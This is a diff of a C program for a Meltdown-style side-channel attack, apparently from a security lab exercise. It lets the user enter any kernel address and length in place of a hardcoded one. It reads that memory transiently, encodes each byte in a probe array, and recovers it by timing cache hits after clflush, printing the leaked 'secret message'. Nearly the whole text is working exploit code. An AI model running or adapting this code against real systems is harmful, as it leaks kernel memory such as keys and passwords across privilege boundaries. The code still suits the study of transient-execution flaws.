@@ -26,8 +26,16 @@ int main(){
 
     unsigned char array[256 * 4096];
 
-    char message[11];
-    message[10] = '\0';
+    int length;
+    long long address;
+    printf("input length of secret message: ");
+    scanf("%d", &length); 
+    printf("input starting address of secret message\n");
+    printf("(in 64-bit hex): ");
+    scanf("%llx", &address); 
+
+    char message[length + 1];
+    message[length] = '\0';
     int fp;
     int sig;
     char data;
@@ -38,10 +46,9 @@ int main(){
     int max;
     int bytec;
 
-
     int counter[256];
 
-    for(bytec = 0; bytec < 10; bytec ++){ // 10 bytes in total need to be read
+    for(bytec = 0; bytec < length; bytec ++){ // length bytes in total need to be read
 
         if((fp = open("/proc/secret_data", O_RDONLY)) < 0)
             return -1;
@@ -55,7 +62,7 @@ int main(){
         for(int i = 0; i < 500; i ++){ // for every byte, try 500 times to increase possibility of success
             if((sig = pread(fp, NULL, 0, 0)) < 0) // put secret data in cache
                 return -1;
-            
+             
             // clear cache
             for(int j = 0; j < 256; j ++) _mm_clflush(&array[j * 4096 + OFFSET]);
 
@@ -70,23 +77,23 @@ int main(){
                     : "eax"
                 ); //magic
 
-                data = *(char *)(0xffffffffc0d72000 + bytec); // exception!
+                data = *(char *)(address + bytec); // exception!
                 array[data * 4096 + OFFSET] = 1;
             }
 
-            for(int i = 0;i < 256;++ i){
+            for(int i = 0;i < 256;++ i){        // measure access time
                 addr = &array[i * 4096 + OFFSET];
                 basetime = __rdtscp(&temp);
                 temp = *addr;
                 mtime = __rdtscp(&temp) - basetime;
                 if(mtime < CACHE_HIT_TIME)
-                    counter[i] ++;
+                    counter[i] ++;              // counter tracks cache hit times
             }
 
         }
 
         max = 0;
-        for(int i = 1; i < 256; i ++){
+        for(int i = 1; i < 256; i ++){          // find value with biggest counter
             if(counter[i] > counter[max])
                 max = i;
         }
@@ -95,7 +102,7 @@ int main(){
 
     }
 
-    printf("%s\n", message);
+    printf("secret message: %s\n", message);
 
     return 0;
 
